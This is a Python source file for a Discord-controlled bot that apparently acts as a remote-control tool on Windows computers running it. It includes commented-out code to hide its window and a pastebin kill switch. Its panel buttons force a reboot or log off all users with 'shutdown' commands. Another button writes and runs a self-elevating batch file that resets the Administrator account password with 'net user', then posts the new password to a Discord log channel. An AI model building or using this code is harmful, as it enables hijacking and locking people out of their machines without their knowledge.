import discord
from discord.ext import commands
from discord import ui
import os
import time
import win32gui, win32con
import asyncio
from discord.ui import text_input
from discord.ext import tasks
import requests
import requests as rq

#the_program_to_hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

ownerid = 0
guildid = 0
accountlink = "https://pastebin.com/raw/"

class Bot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=f"!", intents=discord.Intents.all())
bot = Bot()
@bot.event
async def on_ready():
    global guild
    guild = bot.get_guild(guildid)
    channel_name = "〈📡〉panel-server"
    resp = requests.get(accountlink)
    result = resp.text.split()
    if result != ['1.0']:
        return
    if result == ['1.0']:
        print("hi")
    channel = discord.utils.get(guild.channels, name=channel_name)
    if channel:
        await channel.purge()
        embed=discord.Embed(title="Bot description", description="**All the commands and options you can do\nWarning The software works on everyone who has the bot turned on on his computer**", color=0x00ff82)
        embed.add_field(name="Bot Commands", value="```diff\n- Bot Commands Prefix (!)\n+ Bot Developer = lmao4745```", inline=True)
        await channel.send(embed=embed, view=Bt())

    if not channel:
        panel = await guild.create_text_channel(name=channel_name)
        await panel.set_permissions(guild.default_role, read_messages=False, send_messages=False)
        channel_name = "〈📡〉panel-server"
        channel = discord.utils.get(guild.channels, name=channel_name)
        embed=discord.Embed(title="Bot description", description="**All the commands and options you can do\nWarning The software works on everyone who has the bot turned on on his computer**", color=0x00ff82)
        embed.add_field(name="Bot Commands", value="```diff\n- Bot Commands Prefix (!)\n+ Bot Developer = lmao4745```", inline=True)
        await channel.send(embed=embed, view=Bt())
    
    print("bot is ready")
    
    logs = discord.utils.get(guild.channels, name="passwordlogs")
    if logs:
        pass
    if not logs:
        await guild.create_text_channel(name="passwordlogs")


class Bt(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='〈📡〉Change Password', style=discord.ButtonStyle.red, custom_id='Verify1_view:cp')
    async def cp(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ownerid:
            await interaction.response.send_modal(cpp())
        if interaction.user.id != ownerid:
            await interaction.response.send_message(f'you dont have premissions', ephemeral=True)


    @discord.ui.button(label='〈📡〉Restart', style=discord.ButtonStyle.red, custom_id='Verify1_view:cpr')
    async def cpr(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ownerid:
            await interaction.response.send_message(f'The operation completed successfully', ephemeral=True)
            os.system("shutdown /f /r /t 0")
        if interaction.user.id != ownerid:
            await interaction.response.send_message(f'you dont have premissions', ephemeral=True)
    

    @discord.ui.button(label='〈📡〉Disconnect all users', style=discord.ButtonStyle.red, custom_id='Verify1_view:cpd')
    async def cpd(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ownerid:
            await interaction.response.send_message(f'All users have been disconnected', ephemeral=True)
            os.system("shutdown /f /l")
        if interaction.user.id != ownerid:
            await interaction.response.send_message(f'you dont have premissions', ephemeral=True)


class cpp(ui.Modal, title='Change Password'):
    chh = ui.TextInput(label='Change Password')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)
        f = open("1.bat", "w")
        f.write(f"@echo off\nnet session >nul 2>&1 || (powershell start -verb runas '\"%~0\"' &exit /b)\nnet user Administrator {self.chh}")
        f.close()
        os.system("start 1.bat")
        time.sleep(12)
        os.system("del 1.bat")
        logs = discord.utils.get(guild.channels, name="passwordlogs")
        await logs.send(f"password changed {self.chh}")

bot.run("")